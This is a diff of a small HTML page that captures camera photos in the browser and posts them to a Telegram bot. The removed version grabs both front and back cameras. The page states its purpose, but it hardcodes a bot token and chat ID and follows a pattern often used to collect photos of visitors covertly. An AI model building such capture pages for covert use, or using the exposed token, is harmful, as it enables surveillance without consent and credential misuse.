@@ -1,76 +1,72 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Take Photos and Send to Telegram</title>
+<meta charset="UTF-8">
+<title>Camera to Telegram</title>
 </head>
 <body>
-    <button id="capturePhotos">Take Photos</button>
-    <script>
-        document.getElementById('capturePhotos').addEventListener('click', async () => {
-            try {
-                // Access front and back cameras
-                const frontCamera = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                const backCamera = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
 
-                // Create video elements to capture camera streams
-                const frontVideo = document.createElement('video');
-                const backVideo = document.createElement('video');
+<h2>Ambil Foto dan Kirim ke Telegram</h2>
 
-                frontVideo.srcObject = frontCamera;
-                backVideo.srcObject = backCamera;
+<video id="video" width="300" autoplay></video>
+<br><br>
 
-                frontVideo.play();
-                backVideo.play();
+<button id="capture">Ambil Foto</button>
 
-                // Capture images from both cameras
-                const canvasFront = document.createElement('canvas');
-                const canvasBack = document.createElement('canvas');
+<canvas id="canvas" style="display:none;"></canvas>
 
-                canvasFront.width = frontVideo.videoWidth;
-                canvasFront.height = frontVideo.videoHeight;
-                canvasBack.width = backVideo.videoWidth;
-                canvasBack.height = backVideo.videoHeight;
+<script>
 
-                const contextFront = canvasFront.getContext('2d');
-                const contextBack = canvasBack.getContext('2d');
+const botToken = "8614744009:AAEu0vGF14i_rVeZL6Q6ean-Vq_VC0xrdwc";
+const chatId = "7856697051";
 
-                contextFront.drawImage(frontVideo, 0, 0, canvasFront.width, canvasFront.height);
-                contextBack.drawImage(backVideo, 0, 0, canvasBack.width, canvasBack.height);
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const button = document.getElementById("capture");
 
-                const frontImageData = canvasFront.toDataURL('image/jpeg');
-                const backImageData = canvasBack.toDataURL('image/jpeg');
+// akses kamera
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+    video.srcObject = stream;
+})
+.catch(err => {
+    alert("Kamera tidak bisa diakses");
+});
 
-                // Send images to Telegram bot
-                const botToken = '8614744009:AAEu0vGF14i_rVeZL6Q6ean-Vq_VC0xrdwc';
-                const chatId = '7856697051'; // Replace with your chat ID
+// tombol ambil foto
+button.onclick = async () => {
 
-                const sendImage = async (imageData, caption) => {
-                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            photo: imageData,
-                            caption: caption
-                        })
-                    });
-                    return response.json();
-                };
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
-                await sendImage(frontImageData, 'Selfie');
-                await sendImage(backImageData, 'Back Camera');
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video,0,0);
 
-                // Stop camera streams
-                frontCamera.getTracks().forEach(track => track.stop());
-                backCamera.getTracks().forEach(track => track.stop());
-            } catch (error) {
-                console.error('Error capturing photos:', error);
-            }
-        });
-    </script>
+    const blob = await new Promise(resolve =>
+        canvas.toBlob(resolve,"image/jpeg")
+    );
+
+    const formData = new FormData();
+    formData.append("chat_id",chatId);
+    formData.append("photo",blob,"photo.jpg");
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{
+        method:"POST",
+        body:formData
+    })
+    .then(res => res.json())
+    .then(data => {
+        alert("Foto terkirim ke Telegram!");
+        console.log(data);
+    })
+    .catch(err => {
+        console.log(err);
+        alert("Gagal kirim foto");
+    });
+
+};
+
+</script>
+
 </body>
 </html>
